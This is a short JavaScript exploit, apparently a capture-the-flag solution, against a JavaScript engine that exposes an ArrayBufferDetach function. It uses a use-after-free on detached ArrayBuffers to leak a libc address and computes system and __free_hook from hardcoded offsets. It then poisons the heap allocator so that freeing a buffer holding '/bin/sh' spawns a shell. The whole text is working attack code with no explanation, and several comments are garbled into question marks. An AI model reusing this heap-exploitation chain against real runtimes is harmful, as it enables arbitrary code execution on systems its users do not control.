const backingStore = new ArrayBuffer(0x1000); // ???
const backingStore_u32 = new BigUint64Array(backingStore);

const barrier = new ArrayBuffer(0x440);

ArrayBufferDetach(backingStore);

// Local
LIBC_LEAK = backingStore_u32[1];

// LIBC_BASE = LIBC_LEAK - 0x1b2ca0n;
// SYSTEM = LIBC_BASE + 0x43e60n;
// __FREE_HOOK = LIBC_BASE + 0x1b48e8n;

LIBC_BASE = LIBC_LEAK - 0x3ebca0n;
SYSTEM = LIBC_BASE + 0x4f550n;
__FREE_HOOK = LIBC_BASE + 0x3ed8e8n;
	
console.log(LIBC_BASE.toString(16));

const victim = new ArrayBuffer(0x180); // ??????
const victim_u64 = new BigUint64Array(victim);

ArrayBufferDetach(victim);

victim_u64[0] = __FREE_HOOK;

// dbg();

const binsh = new ArrayBuffer(0x180); // ??????
const binsh_u64 = new BigUint64Array(binsh);
binsh_u64[0] = 0x68732f6e69622fn;

const victim2 = new ArrayBuffer(0x180); // ????????
const victim2_u64 = new BigUint64Array(victim2);
victim2_u64[0] = SYSTEM;
